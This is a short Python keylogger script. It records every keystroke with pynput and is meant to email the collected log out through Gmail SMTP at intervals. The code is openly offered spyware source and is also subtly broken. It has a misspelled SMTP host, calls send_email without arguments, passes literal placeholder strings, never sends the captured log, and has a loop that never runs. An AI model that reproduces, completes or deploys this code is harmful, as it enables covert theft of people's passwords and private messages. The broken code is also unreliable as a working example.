import pynput.keyboard
import smtplib
import time
import threading
#from pynput import keyboard
log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        #log = log.encode() + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass


    print(log)

def send_email(email,password,message):
    # firstly go gmail and lets secure settings turn on
    email_server = smtplib.SMTP("smpt.gmail.com",587)
    email_server.starttls()
    email_server.login("email","password")
    email_server.sendmail("email","email","message")
    email_server.quit()




send_email() # enter parametre(email,password,message)



keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    send_email()
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

with keylogger_listener:
    keylogger_listener.join()

while True:
    send_email()  # enter parametre(email,password,message)
    log = ""
    time.sleep(15)